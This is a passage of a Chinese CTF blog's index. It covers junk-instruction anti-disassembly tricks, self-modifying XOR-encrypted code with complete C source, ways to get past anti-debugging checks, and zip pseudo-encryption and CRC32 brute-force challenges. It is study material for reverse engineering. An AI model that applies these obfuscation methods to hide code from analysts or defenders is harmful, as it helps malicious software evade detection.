= Solver()s.add(sudoku_c + instance_c)if s.check() == sat:    m = s.model()    r = [[m.evaluate(X[i][j]) for j in range(5)]         for i in range(5)]    print_matrix(r)else:    print("failed to solve")</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>花指令</title>
      <link href="/2022/01/17/%E8%8A%B1%E6%8C%87%E4%BB%A4/"/>
      <url>/2022/01/17/%E8%8A%B1%E6%8C%87%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.anquanke.com/post/id/208682">https://www.anquanke.com/post/id/208682</a></p><h1 id="花指令原理"><a href="#花指令原理" class="headerlink" title="花指令原理"></a>花指令原理</h1><p>ida采用的是线性扫描反汇编算法，也就是一步一步往下识别，一旦在中间插入奇怪的立即数，ida可能就会识别出错，进而不能正确反编译</p><h1 id="花指令实现"><a href="#花指令实现" class="headerlink" title="花指令实现"></a>花指令实现</h1><p>首先，我们插入花指令不能阻碍我们程序的正常运行，这是最基本的</p><p>下面使用一段常规代码进行花指令的添加</p><pre class="language-c" data-language="c"><code class="language-c">#include&lt;stdio.h&gt;#include&lt;windows.h&gt;int main(int argc, char* argv[]){char s[] = "1234234";int i = 0, k = 1;for (; i &lt; 10; ++i){k += i;}printf("%d", k);return 0;}</code></pre><p>没插花指令前的反编译</p><p><img src="/2022/01/17/%E8%8A%B1%E6%8C%87%E4%BB%A4/MF%5DH0@C0%5BLZFAI%7BX83MEI.png"></p><h2 id="永真跳转"><a href="#永真跳转" class="headerlink" title="永真跳转"></a>永真跳转</h2><pre class="language-c" data-language="c"><code class="language-c">__asm {    push eax;xor eax, eax;test eax, eax;jz LABEL1;jnz  LABLE2;LABLE2:__emit 0xe8;LABEL1:    pop eax;}</code></pre><p>先来看看效果</p><p><img src="/2022/01/17/%E8%8A%B1%E6%8C%87%E4%BB%A4/1646113378508.png"></p><p>可以看到ida不能正确反编译</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>xor eax,eax能够保证eax的值为0，异或自己，相同为0</p><p>根据目标操作数修改符号标志位、奇偶标志位、零标志位，经过这一步后，ZF为1</p><p>test eax,eax是按位与操作，并且会根据值修改ZF标志位，并且只有当位都清 0 时，零标志位才置 1 </p><p>ZF为1时，jz进行跳转，到LABEL1，因为里面没有其他值，所以代码正常执行，但是在 反编译的时候，因为是线性扫描，所以遇到了LABEL2里面的0xe8（call的机器码），就会将其后面的机器码当作要调用的地址，这样一来，jz就直接跳转到被错误识别的汇编代码中，所以会出现错误</p><h3 id="去除"><a href="#去除" class="headerlink" title="去除"></a>去除</h3><p><img src="/2022/01/17/%E8%8A%B1%E6%8C%87%E4%BB%A4/1646114167483.png"></p><p>可以看到这里面的jz和jnz后面的地址存在+1，这就基本可以看出是花指令了，找到对应的地址，按u取消定义</p><p><img src="/2022/01/17/%E8%8A%B1%E6%8C%87%E4%BB%A4/1646114596608.png"></p><p>可以看到这里也是两个函数，对下面的按C弄成代码</p><p><img src="/2022/01/17/%E8%8A%B1%E6%8C%87%E4%BB%A4/1646114739199.png"></p><p>然后为了反编译，要把0xe8使用90填充，也就是nop，填充后按C即可</p><p><img src="/2022/01/17/%E8%8A%B1%E6%8C%87%E4%BB%A4/1646114800614.png"></p><p>按P弄成函数后反编译，和上面的基本一致</p><p><img src="/2022/01/17/%E8%8A%B1%E6%8C%87%E4%BB%A4/1646114856426.png"></p><h2 id="插入立即数"><a href="#插入立即数" class="headerlink" title="插入立即数"></a>插入立即数</h2><pre class="language-c" data-language="c"><code class="language-c">__asm {xor eax, eax;jz LABEL1;__emit 0x11;__emit 0x22;__emit 0x33;LABEL1:}</code></pre><p>效果</p><p><img src="/2022/01/17/%E8%8A%B1%E6%8C%87%E4%BB%A4/1646115623618.png"></p><p>识别出错，原理和上面一样，感觉这种稍微恶心一点，因为有一段可能是正常的，需要一个一个试</p><p><img src="/2022/01/17/%E8%8A%B1%E6%8C%87%E4%BB%A4/1646115805153.png"></p><p>直接nop掉即可</p><h2 id="破坏堆栈"><a href="#破坏堆栈" class="headerlink" title="破坏堆栈"></a>破坏堆栈</h2><p>我们可以插入对esp和eip的操作进而破坏堆栈</p><pre class="language-c" data-language="c"><code class="language-c">__asm {xor eax, eax;jz LABEL1;add esp, 8;LABEL1:}</code></pre><p><img src="/2022/01/17/%E8%8A%B1%E6%8C%87%E4%BB%A4/1646116696374.png"></p><p>ida能够正常反编译，但是在函数末端会发现堆栈错误提示</p><p><img src="/2022/01/17/%E8%8A%B1%E6%8C%87%E4%BB%A4/1646116781788.png"></p><h2 id="call-amp-ret构造花指令"><a href="#call-amp-ret构造花指令" class="headerlink" title="call&amp;ret构造花指令"></a>call&amp;ret构造花指令</h2><p>call本质是先将其 下一条指令压入栈中，再jmp函数地址</p><p>ret则是pop eip</p><p>所以我们可以修改返回地址，然后在中前插入垃圾数</p><pre class="language-c" data-language="c"><code class="language-c">__asm {call LABEL1;__emit 0x83;LABEL1:add dword ptr ss : [esp] , 8;ret;    __emit 0xf3;}</code></pre><p>效果</p><p><img src="/2022/01/17/%E8%8A%B1%E6%8C%87%E4%BB%A4/1646118501242.png"></p><p>这里我们插入的不是机器码，所以没有识别成奇怪的代码，但是还是让ida出现了错误</p><h3 id="去除-1"><a href="#去除-1" class="headerlink" title="去除"></a>去除</h3><p>全部nop掉即可</p><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p><img src="/2022/01/17/%E8%8A%B1%E6%8C%87%E4%BB%A4/1646122556219.png"></p><p>这里之所以程序能够进行正常的运行，是因为call会把其下一条指令的地址压入栈中，也就是41459F，（不知道为什么这里会多出一个db 36h -.-)，接下来执行将当前esp地址的值+8，也就是栈顶存储的值+8，也就是返回地址加8，正好对应4145A7，下面的代码c之后是正常的代码，所以不会出错</p><p>在此基础上，我们可以构造各种花指令</p><p>下面连接有一些花指令</p><p><a href="https://www.bilibili.com/read/cv13177757">https://www.bilibili.com/read/cv13177757</a></p><h2 id="call嵌套"><a href="#call嵌套" class="headerlink" title="call嵌套"></a>call嵌套</h2><pre class="language-c" data-language="c"><code class="language-c">__asm {call LABEL1;_emit 0xE8;LABEL2:jmp LABEL3;_emit 0;_emit 0;_emit 0xE8;_emit 0xf6;_emit 0xff;_emit 0xff;_emit 0xff;LABEL1:call LABEL2;LABEL3:add esp, 8;}</code></pre><p>效果</p><p><img src="/2022/01/17/%E8%8A%B1%E6%8C%87%E4%BB%A4/1646123989260.png"></p><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>这里之所以程序能够正常运行，是因为只有两个call对堆栈有影响，所以只需要在最后esp+8就可以回到原来的堆栈</p><p><img src="/2022/01/17/%E8%8A%B1%E6%8C%87%E4%BB%A4/1646124342486.png"></p><p>这里先callA9，然后0xE8和后面的结合成了call指令，这里可以看到call到了全是int 3的地方</p><p><img src="/2022/01/17/%E8%8A%B1%E6%8C%87%E4%BB%A4/1646124399722.png"></p><p>然后这个9f一直在call自己，所以可以判断是花指令</p><p>把这两个函数nop掉之后</p><p><img src="/2022/01/17/%E8%8A%B1%E6%8C%87%E4%BB%A4/1646124643631.png"></p><p>所以这个调用也没用了</p><p><img src="/2022/01/17/%E8%8A%B1%E6%8C%87%E4%BB%A4/1646124712766.png"></p><p>同理这个也可以nop掉，那么堆栈会不平衡，add esp,8也要nop</p><p><img src="/2022/01/17/%E8%8A%B1%E6%8C%87%E4%BB%A4/1646124803779.png"></p><p>得到正常代码</p><h2 id="jmp变形-SUSCTF2022-tttree"><a href="#jmp变形-SUSCTF2022-tttree" class="headerlink" title="jmp变形-SUSCTF2022-tttree"></a>jmp变形-SUSCTF2022-tttree</h2><p>感觉很巧妙，拿出来看看</p><p>动调可以看得更清楚</p><p><img src="/2022/01/17/%E8%8A%B1%E6%8C%87%E4%BB%A4/1646126953595.png"></p><p>前面的push没什么好说的，关键在call之后的</p><p><img src="/2022/01/17/%E8%8A%B1%E6%8C%87%E4%BB%A4/1646127104589.png"></p><p>当前的栈顶，call会将其之后的地址压入栈顶</p><p><img src="/2022/01/17/%E8%8A%B1%E6%8C%87%E4%BB%A4/1646127228921.png"></p><p>可以看到是B7D82FF9B0</p><p>下面两步就是将当前栈顶的元素先+0x191b给到rax</p><p><img src="/2022/01/17/%E8%8A%B1%E6%8C%87%E4%BB%A4/1646127367726.png"></p><p>下一步是把rax里的值给到rsp+16</p><p><img src="/2022/01/17/%E8%8A%B1%E6%8C%87%E4%BB%A4/1646127416441.png" alt="1646127416441"></p><p><img src="/2022/01/17/%E8%8A%B1%E6%8C%87%E4%BB%A4/1646127424928.png"></p><p>经过两步pop，可以发现来到了存储原本返回值+0x191b的栈的位置</p><p><img src="/2022/01/17/%E8%8A%B1%E6%8C%87%E4%BB%A4/1646127512911.png"></p><p>retn先将栈顶元素pop到eip，再jmp，而eip正好记录我们下一步执行的指令</p><p>这样就是一个简单的jmp</p><p>解决方法就是先计算跳转的地址，然后改成jmp即可</p>]]></content>
      
      
      
        <tags>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SMC</title>
      <link href="/2022/01/17/SMC/"/>
      <url>/2022/01/17/SMC/</url>
      
        <content type="html"><![CDATA[<p>参考文章：<a href="https://www.anquanke.com/post/id/238645">https://www.anquanke.com/post/id/238645</a></p><p><a href="https://blog.csdn.net/PandaOS/article/details/46575441?spm=1001.2101.3001.6650.1&amp;utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1.pc_relevant_antiscanv2&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1.pc_relevant_antiscanv2&amp;utm_relevant_index=2">https://blog.csdn.net/PandaOS/article/details/46575441?spm=1001.2101.3001.6650.1&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1.pc_relevant_antiscanv2&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1.pc_relevant_antiscanv2&amp;utm_relevant_index=2</a></p><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>SMC，是self-modifying-code的缩写 ，即自我修改的代码，通过程序运行后执行相关代码功能，对加密的代码数据进行解密，让其恢复正常功能</p><h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><p>1、要有两个函数，一个用于加密，一个用于解密，两个是对应的</p><p>2、找到要SMC的代码地址，然后提前在程序开始的地方设置对该地址数据的解密函数</p><p>3、取出要进行SMC的代码的字节码，对其使用准备好的加密函数进行加密</p><p>4、用这串加密的数据替换原代码的字节码</p><h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p><a href="https://buuoj.cn/challenges#[%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E9%9D%92%E9%BE%99%E7%BB%84]jocker">https://buuoj.cn/challenges#[%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E9%9D%92%E9%BE%99%E7%BB%84]jocker</a></p><h1 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h1><p>打开ida反编译看到</p><p><img src="/2022/01/17/SMC/1642563702820.png"></p><p>点进这个函数ida直接报错</p><p><img src="/2022/01/17/SMC/1642563778289.png"></p><p>查看汇编代码</p><p><img src="/2022/01/17/SMC/1642563800178.png"></p><p>点击函数跟进</p><p><img src="/2022/01/17/SMC/1642563901545.png"></p><p>发现一长串没被识别的数据段，这种情况可能是花指令导致，也可能是SMC，结合之前有一个循环异或，可以猜测是SMC，接下来有两种方法解密 </p><h2 id="使用IDC对加密数据进行解密"><a href="#使用IDC对加密数据进行解密" class="headerlink" title="使用IDC对加密数据进行解密"></a>使用IDC对加密数据进行解密</h2><p>首先要找到被加密数据段的初始地址以及加密数据段的长度，这里长度在for循环里面，初始位置</p><p><img src="/2022/01/17/SMC/1642566995107.png"></p><p>点击函数跳转</p><p><img src="/2022/01/17/SMC/1642567097998.png"></p><p>黄色段就是初始地址，可以看到这里函数入口并不是pop开始，所以也可以猜到被加密了</p><p>idc脚本如下(shift+f2)打开</p><pre class="language-c" data-language="c"><code class="language-c">#include &lt;idc.idc&gt;static main(){    auto addr = 0x401500;    auto i = 0;    for(i=0;i&lt;187;i++)    {        PatchByte(addr+i,Byte(addr+i)^0x41);    }}</code></pre><p>得到了解密的数据段</p><p><img src="/2022/01/17/SMC/1642567365432.png"></p><h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><p>因为程序自带解密函数，只需要在解密函数后面下断点，运行到断点处，被加密的数据段就能成功解密</p><p><img src="/2022/01/17/SMC/1642565058450.png"></p><p>这是未解密的，运行后</p><p><img src="/2022/01/17/SMC/1642565236932.png"></p><p>这时候只需要先对函数按U，取消定义，然后选中按C——force转为汇编代码</p><p><img src="/2022/01/17/SMC/1642565348450.png"></p><p>然后按p定义成函数，再按F5就可以正常反编译了</p><p><img src="/2022/01/17/SMC/1642565393714.png"></p><h1 id="SMC-反调试技术"><a href="#SMC-反调试技术" class="headerlink" title="SMC+反调试技术"></a>SMC+反调试技术</h1><p>因为smc可以采取动态调试来还原加密代码，所以可以采用反调试技术来阻止动态调试，所以这时候就需要绕过</p><h2 id="狗狗的秘密"><a href="#狗狗的秘密" class="headerlink" title="狗狗的秘密"></a>狗狗的秘密</h2><p><img src="/2022/01/17/SMC/1643034259013.png"></p><p>在数据段发现这里类型SMC，猜测是SMC自修改，所以需要定位到解密函数</p><p>在exports发现了一个函数</p><p>TLS回调函数会在oep也就是程序入口前执行</p><p><img src="/2022/01/17/SMC/1643034347085.png"></p><p>这个函数会在main函数之前执行，所以先进去看看</p><p><img src="/2022/01/17/SMC/1643034411621.png"></p><p>把鼠标放在上面发现他是个指针，被赋值为smc的函数段，v8同理，所以接下来这一段应该就是smc解密代码</p><p><img src="/2022/01/17/SMC/1643034535760.png"></p><p>很明显是tea，不会写idctea脚本，所以打算采取动调，但是前面有几个反调试，需要绕过，保证能走到解密代码这一步 </p><p><img src="/2022/01/17/SMC/1643034646186.png"></p><p>对于if语句，只需要用jnz或jz替换即可</p><p>所以相对来说还行，主要是要先定位到这里</p><p><img src="/2022/01/17/SMC/1643034751964.png"></p><p>也可以去这些函数列表看一看</p><p>动调完成还是发现出错，所以里面的值可能被引用修改，对着变量按x查看交叉引用</p><p><img src="/2022/01/17/SMC/1643034871276.png"></p><p>发现在此之前被修改过，但是动调的时候显示是0，很奇怪，不知道什么时候赋值的，所以第一次进入 tea函数需要先对dword_915168的值在hex窗口进行修改</p><p><img src="/2022/01/17/SMC/1643035000708.png"></p><p>要注意在这个窗口中数据以小端序存储</p><p>修改好之后，下好断点后f9让程序跑起来就可以了</p><p><img src="/2022/01/17/SMC/1643035086013.png"></p><p>之后就是前面说的，先取消定义，然后转为代码，再定义函数</p><p>寻找怎么修改hex值的时候发现了 可以添加查看窗口，就很方便，在VM逆向里面可能会看起来更方便</p><p><img src="/2022/01/17/SMC/1643035222239.png"></p><p><img src="/2022/01/17/SMC/1643035235237.png"></p><h1 id="SMC实现"><a href="#SMC实现" class="headerlink" title="SMC实现"></a>SMC实现</h1><p>下面所说的段就是节</p><p>先贴源码</p><pre class="language-c" data-language="c"><code class="language-c">#define _CRT_SECURE_NO_WARNINGS#include&lt;stdio.h&gt;#include&lt;string.h&gt;#include&lt;stdlib.h&gt;#include&lt;Windows.h&gt;#include&lt;malloc.h&gt;#pragma code_seg(".scode")void _declspec(naked) Func()//我这里声明一个裸函数，自己开辟堆栈和释放堆栈，避开检测堆栈的函数，防止函数地址重定位的影响{//通过特征块定位到函数开头    __asm {        nop        nop        nop        nop    }    __asm    {        push        ebp        mov         ebp, esp        sub         esp, 0C0h    }    printf("helloworld");    __asm {        add         esp, 0C0h        pop         ebp        ret    }}#pragma code_seg()#pragma comment(linker, "/SECTION:.scode,ERW")void decode(){   //通过获取线程句柄可以得到我们的基地址    LPVOID pModule = GetModuleHandle(NULL);//传入参数为NULL时，表示获取当前程序的基址，也就是MZ    //初始化结构体指针    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)(pModule);    PIMAGE_NT_HEADERS32 pNTheader = (PIMAGE_NT_HEADERS32)((DWORD)pModule + pDosHeader-&gt;e_lfanew);    PIMAGE_FILE_HEADER pFileHeader = (PIMAGE_FILE_HEADER)((DWORD)pNTheader + 4);    PIMAGE_OPTIONAL_HEADER32 pOptionHeader = (PIMAGE_OPTIONAL_HEADER32)((DWORD)pFileHeader + sizeof(IMAGE_FILE_HEADER));    PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pOptionHeader + sizeof(IMAGE_OPTIONAL_HEADER32));        //遍历节表得到我们的解密节表    for (int i = 0; i &lt; pFileHeader-&gt;NumberOfSections; i++, pSectionHeader++)    {        if (!strcmp((const char*)pSectionHeader-&gt;Name, ".scode"))        {            PBYTE pSection = (PBYTE)((DWORD)pModule + pSectionHeader-&gt;VirtualAddress);            for (DWORD k = 0; k &lt; pSectionHeader-&gt;SizeOfRawData; ++k)            {                if (*(PDWORD)pSection == 0xC4C4C4C4)                {                    char comp[] = {0xcc,0xcc,0xcc,0xcc,0xcc,0xcc};                    printf("找到函数段");                    for (;; ++k)                    {                        if (strncmp((const char*)(pSection), comp, 6))                        {                            *(pSection) ^= 0x54;                            printf("%02X", *(pSection));                            pSection++;                        }                        else                        {                            printf("不在函数段内,退出加密");                            return;                        }                   }               }                pSection += 4;            }            printf("解密成功\n");        }    }}int main(){    decode();    Func();return 0;}</code></pre><p>这里只做了一个简单的异或加密</p><p>解释一下一些实现的步骤，如果要实现比较难的加密算法，需要先将原本数据DUMP下来，加密后再重新放入exe文件中，exe文件存放解密代码</p><h2 id="插入段"><a href="#插入段" class="headerlink" title="插入段"></a>插入段</h2><p>1、生成段</p><p>生成名称为.socde的段，如果不填写则默认添加到.text段后面</p><pre class="language-c" data-language="c"><code class="language-c">#pragma code_seg(".scode")</code></pre><p>2、段结尾</p><pre class="language-c" data-language="c"><code class="language-c">#pragma code_seg()</code></pre><p>通过上面两行代码可以生成一个段</p><p>3、设置段的属性</p><pre class="language-c" data-language="c"><code class="language-c">#pragma comment(linker, "/SECTION:.scode,ERW")</code></pre><p>三个字母分别对应可执行、可读和可写</p><h2 id="在段中插入函数"><a href="#在段中插入函数" class="headerlink" title="在段中插入函数"></a>在段中插入函数</h2><p>前面第一和第二行代码之间插入代码-函数，当然是可以直接插入函数的，这里是自己用汇编代码构造的函数</p><p>解释一下为什么前面先插了几个nop，首先我们要知道不同编译器使用生成段的代码得到结果是不同的</p><p><img src="/2022/01/17/SMC/1647950648709.png" alt="VC6生成段"></p><p><img src="/2022/01/17/SMC/1647950674759.png" alt="VS2022生成段"></p><p>可以看到VS2022中我们写的函数在生成段的中间，那么就需要定位，而VC6又不一样了，具体情况具体分析吧</p><p>所以在VS2022中，我们要先定位到插入的函数，而不能直接将整个段加密，这也是为什么插入nop的原因，nop可以用作特征码来识别，当然也可以替换或不用</p><h2 id="定位到段的位置"><a href="#定位到段的位置" class="headerlink" title="定位到段的位置"></a>定位到段的位置</h2><p>先来介绍一个函数，GetModuleHandle可以得到进程的句柄，当传入的参数为NULL时，可以得到当前运行程序的基址，也就是ImageBase，这一块还需要多了解，就先简单介绍</p><p>得到基址之后我们就可以根据windows.h提供的结构体指针，得到PE头、DOS头、节表的信息</p><pre class="language-c" data-language="c"><code class="language-c">//通过获取线程句柄可以得到我们的基地址    LPVOID pModule = GetModuleHandle(NULL);//传入参数为NULL时，表示获取当前程序的基址，也就是MZ    //初始化结构体指针    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)(pModule);    PIMAGE_NT_HEADERS32 pNTheader = (PIMAGE_NT_HEADERS32)((DWORD)pModule + pDosHeader-&gt;e_lfanew);    PIMAGE_FILE_HEADER pFileHeader = (PIMAGE_FILE_HEADER)((DWORD)pNTheader + 4);    PIMAGE_OPTIONAL_HEADER32 pOptionHeader = (PIMAGE_OPTIONAL_HEADER32)((DWORD)pFileHeader + sizeof(IMAGE_FILE_HEADER));    PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pOptionHeader + sizeof(IMAGE_OPTIONAL_HEADER32));</code></pre><p>接着就是遍历，比较段的名字，这样就可以定位到我们插入的段</p><h2 id="定位段位置"><a href="#定位段位置" class="headerlink" title="定位段位置"></a>定位段位置</h2><p>我们先前得到的句柄+该节的VirtualAddress就是节开始的地方</p><p>因为我们加密时是单字节加密，所以转为(PBYTE)型</p><h2 id="根据特征代码定位"><a href="#根据特征代码定位" class="headerlink" title="根据特征代码定位"></a>根据特征代码定位</h2><p>因为SMC会在程序运行中进行解密，所以我们要定位到函数位置</p><p>nop的机器码是0x90，异或加密后是0xC4，注意这里的小段序问题</p><h2 id="判断结束位置"><a href="#判断结束位置" class="headerlink" title="判断结束位置"></a>判断结束位置</h2><p>在这个例子中，结束代码之后都是0xCC，这样就可以使用字符串比较，然后判断是否到达末尾</p><pre class="language-c" data-language="c"><code class="language-c">if (strncmp((const char*)(pSection), comp, 6))                        {                            *(pSection) ^= 0x54;                            printf("%02X", *(pSection));                            pSection++;                        }                        else                        {                            printf("不在函数段内,退出加密");                            return;                        }</code></pre><h2 id="修改exe文件"><a href="#修改exe文件" class="headerlink" title="修改exe文件"></a>修改exe文件</h2><p>这里我把加密后的数据打印了出来，方便贴到exe中</p><p><img src="/2022/01/17/SMC/1647951555438.png" alt="修改后的字节"></p><h2 id="效果展示"><a href="#效果展示" class="headerlink" title="效果展示"></a>效果展示</h2><p>运行exe发现</p><p><img src="/2022/01/17/SMC/1647951602713.png"></p><p>最后打印的就是段中的代码结果</p><p>ida中，可以看到已经无法正常反编译</p><p><img src="/2022/01/17/SMC/1647951757121.png" alt="ida中函数情况"></p><h1 id="另外实现"><a href="#另外实现" class="headerlink" title="另外实现"></a>另外实现</h1><p>更多的可以看去文章头部的链接看看</p><p>我们可以手动定位到加密的位置，这样就比较麻烦，因为还要计算大小，不过代码倒是比较简单</p><pre class="language-c" data-language="c"><code class="language-c">for (DWORD i = 0; i &lt; 30; ++i)   {       *(unsigned char*)(0x00411780 + i) ^= 0x54;       printf("%02X", *(unsigned char*)(0x00411780 + i));   }   printf("解密成功\n");</code></pre><p>理论上还有另外一种实现方法，直接读取文件中的信息，然后将foa转为rva，这样的话我们就可以找到我们smc的地址，这里可以新建段也可以直接在.text段尾部插入，但是要注意长度够不够，同样现插入特征码，使用strncmp进行比较，因为空的节表剩余是0，长度计算可以使用strlen，估计的。晚点再实现</p><p>foa转rva的话就是计算相对该段的pointerofrawdata的偏移，然后转为在内存中的偏移即可也就是imagebase+该段的virtualaddress+偏移，加密替换即可</p>]]></content>
      
      
      
        <tags>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>zip</title>
      <link href="/2022/01/15/zip/"/>
      <url>/2022/01/15/zip/</url>
      
        <content type="html"><![CDATA[<h1 id="伪加密"><a href="#伪加密" class="headerlink" title="伪加密"></a>伪加密</h1><h2 id="伪加密原理及操作"><a href="#伪加密原理及操作" class="headerlink" title="伪加密原理及操作"></a>伪加密原理及操作</h2><h3 id="zip文件组成"><a href="#zip文件组成" class="headerlink" title="zip文件组成"></a>zip文件组成</h3><p>可以去里面看看，挺全的</p><p><a href="https://blog.csdn.net/qq_26187985/article/details/83654197">https://blog.csdn.net/qq_26187985/article/details/83654197</a></p><h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p>这里找了一道大佬出的题，适合练练手</p><p>《美丽的烟火》</p><p>链接：<a href="http://ctf.bugku.com/challenges/detail/id/350.html">http://ctf.bugku.com/challenges/detail/id/350.html</a></p><p>直接打开压缩包，可以得到被加密的文件</p><p><img src="/2022/01/15/zip/1642245880907.png"></p><p>痛苦，一般这种没有提示的(下面会有介绍)，一般就是伪加密了。</p><p>拖进winhex，搜索504b0102（不知道为什么的速速去看前面那篇文章），这个按钮</p><p><img src="/2022/01/15/zip/1642246321198.png"></p><p>把09改成00，要仔细，这里有两个，我开始只看到一个</p><p><img src="/2022/01/15/zip/1642246469204.png"></p><p><img src="/2022/01/15/zip/1642246506196.png"></p><p>重新打开压缩包</p><p><img src="/2022/01/15/zip/1642246638206.png"></p><p>心情愉悦~</p><p>接下来就是进行解密了</p><p>这里不细讲了，不然就跑偏了，png文件是stegpy隐写，密码是shumu，stegpy安装应该会有问题，具体安装请看图片隐写</p><p><img src="/2022/01/15/zip/1642246877362.png"></p><p>password解密是base64，base58，栅栏，</p><p>这里推荐一篇博客</p><p>得到的字符串是aes的key，然后直接aes在线解密</p><p><img src="/2022/01/15/zip/1642247152438.png"></p><p>flag：flag{yX73nAutbBozYhge6d2flG}</p><p>网站也放这了：<a href="https://the-x.cn/cryptography/Aes.aspx">https://the-x.cn/cryptography/Aes.aspx</a></p><h3 id="注"><a href="#注" class="headerlink" title="注"></a>注</h3><p>winrar可以修复伪加密，不过是部分的</p><p><img src="/2022/01/15/zip/1642251859085.png"></p><p>点开上面的工具-&gt; 修复压缩文件</p><h1 id="套娃压缩包"><a href="#套娃压缩包" class="headerlink" title="套娃压缩包"></a>套娃压缩包</h1><p>顾名思义，就是压缩包套娃</p><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p><a href="https://buuoj.cn/challenges#[MRCTF2020]%E5%8D%83%E5%B1%82%E5%A5%97%E8%B7%AF">https://buuoj.cn/challenges#[MRCTF2020]%E5%8D%83%E5%B1%82%E5%A5%97%E8%B7%AF</a></p><h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><pre class="language-python" data-language="python"><code class="language-python">from PIL import Imagex = y = 200img = Image.new("RGB",(x,y))file = open('./qr.txt','r')for width in range(0,x):    for height in range(0,y):        line = file.readline()        rgb = line.replace('(','').replace(')','').split(',')        img.putpixel((width,height),(int(rgb[0]),int(rgb[1]),int(rgb[2])))img.save('flag.jpg')</code></pre><h1 id="CRC32爆破"><a href="#CRC32爆破" class="headerlink" title="CRC32爆破"></a>CRC32爆破</h1><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>CRC校验实用程序库 在数据存储和数据通讯领域，为了保证数据的正确，就不得不采用检错的手段。在诸多检错手段中，CRC是最著名的一种。CRC的全称是循环冗余校验。(这里还不是很懂，后续再看)</p><p>总之每个文件都有唯一的CRC32值，即便数据中一个bit发生变化，也会导致CRC32值不同。若是知道一段数据的长度和CRC32值，便可穷举数据，与其CRC32对照，以此达到暴力猜解的目的。但通常只适用于较小文本文件。</p><h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><p>打开里面有很多压缩包，里面存储的都是小数据文件</p><p><img src="/2022/01/15/zip/1642249237942.png"></p><p><img src="/2022/01/15/zip/1642249207274.png"></p><p>直接上脚本(不是很会)</p><pre class="language-python" data-language="python"><code class="language-python">#python3import zipfileimport stringimport binasciidef CrackCrc(crc):for i in dic:for j in dic:for k in dic:for h in dic:s = i + j + k + hif crc == (binascii.crc32(s.encode())):f.write(s)returndef CrackZip():for i in range(0,68):file = 'D:\\new\\新建文件夹\\out'+str(i)+'.zip'crc = zipfile.ZipFile(file,'r').getinfo('data.txt').CRCCrackCrc(crc)print('\r'+"loading：{:%}".format(float((i+1)/68)),end='')dic = string.ascii_letters + string.digits + '+/='f = open('printaaa.txt','w')print("\nCRC32begin")CrackZip()print("CRC32finished")f.close()</code></pre><p>得到base64编码的东西</p><pre class="language-none"><code class="language-none">z5BzAAANAAAAAAAAAKo+egCAIwBJAAAAVAAAAAKGNKv+a2MdSR0zAwABAAAAQ01UCRUUy91BT5UkSNPoj5hFEVFBRvefHSBCfG0ruGnKnygsMyj8SBaZHxsYHY84LEZ24cXtZ01y3k1K1YJ0vpK9HwqUzb6u9z8igEr3dCCQLQAdAAAAHQAAAAJi0efVT2MdSR0wCAAgAAAAZmxhZy50eHQAsDRpZmZpeCB0aGUgZmlsZSBhbmQgZ2V0IHRoZSBmbGFnxD17AEAHAA==</code></pre><p>网站在线解码，这个网站挺好的，可以直接转换文件</p><p><a href="https://the-x.cn/base64/">https://the-x.cn/base64/</a></p><p>解码后在尾部看到这句话</p><p><img src="/2022/01/15/zip/1642250774952.png"></p><p>他让我们修复文件，所以我们首先要先了解文件头和尾</p><p><a href="https://blog.csdn.net/Ahuuua/article/details/109165473?spm=1001.2101.3001.6650.2&amp;utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~default-2.queryctrv2&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~default-2.queryctrv2">https://blog.csdn.net/Ahuuua/article/details/109165473?spm=1001.2101.3001.6650.2&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7Edefault-2.queryctrv2&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7Edefault-2.queryctrv2</a></p><p>修补好rar文件头在注释里得到flag</p><p>flag{nev3r_enc0de_t00_sm4ll_fil3_w1th_zip}</p><h1 id="压缩文件带注释"><a href="#压缩文件带注释" class="headerlink" title="压缩文件带注释"></a>压缩文件带注释</h1><p>有一些题目会在注释里面添加信息，直观的就不说了，现在说两种空白符，Whitespace <a href="https://vii5ard.github.io/whitespace/">https://vii5ard.github.io/whitespace/</a> 和snow隐写，snow需要密码，有可执行文件</p><h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><p><a 